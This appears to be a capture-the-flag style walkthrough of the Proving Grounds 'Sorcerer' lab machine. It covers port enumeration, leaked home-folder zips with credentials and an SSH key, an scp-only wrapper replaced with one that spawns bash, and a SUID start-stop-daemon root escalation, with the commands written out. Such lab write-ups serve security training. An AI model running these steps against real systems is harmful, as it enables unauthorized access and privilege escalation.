---
layout: post
title: Proving Grounds Practice Sorcerer  
subtitle: Intermediate
tags: [PG]
---

| Name | Sorcerer |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Intermediate |

# Port Scan

I started with a quick port scan of the machine and there are a handful of open ports to poke at
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7742/tcp  open  msss
8080/tcp  open  http-proxy
35099/tcp open  unknown
41269/tcp open  unknown
52103/tcp open  unknown
59601/tcp open  unknown
```

I did a more in-depth scan using the switch `-sVC` and the two ports that stick out to me are 111 rpcbind and 7742 http. Regardless I'll go through and enumerate each port
```
PORT      STATE SERVICE  VERSION                                                                                                                       
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      58620/udp   mountd
|   100005  1,2,3      59601/tcp   mountd
|   100021  1,3,4      35099/tcp   nlockmgr
|   100021  1,3,4      46397/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
35099/tcp open  nlockmgr 1-4 (RPC #100021)
41269/tcp open  mountd   1-3 (RPC #100005)
52103/tcp open  mountd   1-3 (RPC #100005)
59601/tcp open  mountd   1-3 (RPC #100005)
```

# SSH 22

SSH has a fairly low attack surface so I'll skip this for now and come back if I get stuck.

# HTTP 80
The home page of this site gave me a 404 and there was nothing in the source code of the page.

`feroxbuster` was not able to find anything, moving on to next protocol 
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer]
└─# feroxbuster --url http://192.168.172.100                                                                                

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.172.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        3w       14c http://192.168.172.100/
[####################] - 1m     60000/60000   0s      found:1       errors:0      
[####################] - 1m     30000/30000   349/s   http://192.168.172.100 
[####################] - 1m     30000/30000   348/s   http://192.168.172.100/ 
```

# RPCBIND 111

This shows the binding of services to protocols. I ran another `nmap` scan using `nfs` `nse` scripts but nothing came back. There is not much I can do with this so I'll move on.

```
┌──(root㉿kali)-[~/provingGrounds/sorcerer]
└─# nmap -p 111 --script=nfs* 192.168.172.100  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 11:50 EDT
Nmap scan report for 192.168.172.100
Host is up (0.14s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
|_nfs-showmount: No NFS mounts available

Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
                                                                                                                                                             
┌──(root㉿kali)-[~/provingGrounds/sorcerer]
└─# nmap -p 2049 --script=nfs* 192.168.172.100
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 11:50 EDT
Nmap scan report for 192.168.172.100
Host is up (0.14s latency).

PORT     STATE SERVICE
2049/tcp open  nfs
```

# HTTP 7742
The home page is a control panel with options to log in

![Sorcerer](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sorcerer/image1.png)

I tried some default creds but every time I would get a popup saying "Invalid Login". I turned on `burpsuite` to intercept the request and noticed that nothing was being sent to the server. (Burp would not intercept anything)

Looking at the source code every time the "Login" button is it just flashes "Invalid Login". This page does nothing
```
<div class="container">
    <label for="username" style="font-family:verdana;"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="username" required>
    <label for="password" style="font-family:verdana;"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" required>
--->  <button onclick="ifLoginAdminFalse()" type="submit">Login</button>
```

My next steps were to start fuzzing out other files or directories to play with. `feroxbuster` identified `/default` that returned a 404 and `/zipfiles` 
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer]              
└─# feroxbuster --url http://192.168.172.100:7742/                                                              
                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___                                                                                                           
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                           
by Ben "epi" Risher 🤓                 ver: 2.7.1                                                                                                            
───────────────────────────┬──────────────────────                            
 🎯  Target Url            │ http://192.168.172.100:7742/                     
 🚀  Threads               │ 50                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7                                                
 🦡  User-Agent            │ feroxbuster/2.7.1                                                                                                               
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                              
 🏁  HTTP methods          │ [GET]                                                                                                                           
 🔃  Recursion Depth       │ 4                                                                                                                               
───────────────────────────┴──────────────────────                                                                                                           
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                          
──────────────────────────────────────────────────                                                                                                           
200      GET       65l      117w     1219c http://192.168.172.100:7742/                                                                                      
301      GET        7l       12w      178c http://192.168.172.100:7742/default => http://192.168.172.100:7742/default/
301      GET        7l       12w      178c http://192.168.172.100:7742/zipfiles => http://192.168.172.100:7742/zipfiles/ 
```

http://192.168.172.100:7742/zipfiles/ contained zipfiles, who would have thought?
![Sorcerer](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/sorcerer/image2.png)

Unzipping each of the folders showed that they are zips of the user's home folders
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer/zipFiles/home]
└─# ls          
francis  max  miriam  sofia
```

Max had three interesting files inside his home directory. The first was some credential to `tomcat` 
`<user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>`

Next was an interesting script called `scp_wrapper.sh`. All this is doing is evaluating if `scp` is in the variable `$SSH_ORIGINAL_COMMAND`, if its not it will print the `scp` usage
```
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac 
```

And the last was an `id_rsa` private key. Trying to log in with it gave me this error and printed out the `scp` usage.
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer]
└─# ssh -i max_rsa max@192.168.172.100                                        
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
Connection to 192.168.172.100 closed.
```

That script is filtering on `ssh` to only allow `scp`. I did some googling and I found a [forum post](https://bbs.archlinux.org/viewtopic.php?id=72493) that shows code that is very similar to what I am working with. "Taco Eater" says that there is a control using the `authorized_keys` file. There was a copy of Max's in the zip file. 

```
┌──(root㉿kali)-[~/…/zipFiles/home/max/.ssh]
└─# cat authorized_keys 
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer 
```

#### Command=
https://www.virtono.com/community/tutorial-how-to/restrict-executable-ssh-commands-with-authorized-keys/
Usually, the `authorized_keys` file in a `.ssh` directory is used to give a user access to a system. By default just dumping an `id_rsa.pub` will give the user full access to the system. But in some cases, you can give the user access to specific commands or operations. That is the case with this machine. 

An example is given below with the `date` command. Whenever zon tried to log into the machine it will run the date command 
```
$ cat .ssh/authorized_keys 
command = "date" ssh-rsa AAAA [ ... ] zon@rocks
```

```
: ~ $ ssh zon@a.b.c.d
Wed Oct 10 14:46:53 CEST 2022
Connection to a.b.c.d closed.
```

Whenever `max` logs into `sorcerer` it will run the `scp_wrapper.sh` script and take in the arguments and pass them into `$SSH_ORIGINAL_COMMAND` to be evaluated if `scp` is in the command

Using `scp` with the private key I wanted to try and see if I could retrieve files from the server but I got a strange error message
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer]
└─# scp -i max_rsa max@192.168.172.100:/etc/passwd .                          
scp: Received message too long 1094927173
scp: Ensure the remote shell produces no output for non-interactive sessions.
```

After reading the `man` page for `scp` I tried the `-O` option that will use a legacy protocol rather than sftp and it worked. 
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer/files]
└─# scp -i ../max_rsa -O max@192.168.172.100:/etc/passwd .
passwd                                                                                                                     100% 1697    11.8KB/s   00:00    
                                                                                                                                                             
┌──(root㉿kali)-[~/provingGrounds/sorcerer/files]
└─# tail passwd
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
francis:x:1000:1000::/home/francis:/bin/bash
sofia:x:1001:1001::/home/sofia:/bin/bash
miriam:x:1002:1002::/home/miriam:/bin/bash
max:x:1003:1003::/home/max:/bin/bash
dennis:x:1004:1004::/home/dennis:/bin/bash
tomcat:x:1005:1005::/opt/tomcat:/bin/false
```

Now that I can interact with the file system I will replace `scp_wrapper.sh` with a malicious one that will just run `bash` when I log in. This will work because the first statement will evaluate to false as I'm not running `scp`, then it will echo "ZON" and drop me into a bash session
```
┌──(root㉿kali)-[~/provingGrounds/sorcerer/files]
└─# cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ZON"
    bash
    ;;
esac

┌──(root㉿kali)-[~/provingGrounds/sorcerer/files]
└─# scp -i ../max_rsa -O scp_wrapper.sh max@192.168.172.100:/home/max/scp_wrapper.sh                                    
scp_wrapper.sh                                                                                                             100%  124     0.9KB/s   00:00    
                                                                                                                                                             
┌──(root㉿kali)-[~/provingGrounds/sorcerer/files]
└─# ssh -i ../max_rsa max@192.168.172.100                                                                               
PTY allocation request failed on channel 0
ZON
id
uid=1003(max) gid=1003(max) groups=1003(max)

```

# Root

I transferred over `linpeas.sh` onto the machine using `wget` and `python3 -m http.server 80` and ran it. Under the `SUID` section there was some red and yellow on `start-stop-daemon`
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon

```

I did a search on gtfo bins and found that there was a priv esc for it. Notice that my `euid` is `root` allowing me to read `/root/proof.txt`
```
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
id
uid=1003(max) gid=1003(max) euid=0(root) groups=1003(max)
```

# Things Learned
This machine was pretty fun, it defiantly challenged me. I got stuck on HTTP 7742 for a while. I could not think of what to do next, but I had to go back to the basics and fuzz files and directories.

I also was able to brush up on my bash scripting and learn about `case` statements. 

The `authorized_keys` control was also new to me. I did not know you could "lock down" ssh in that way. 
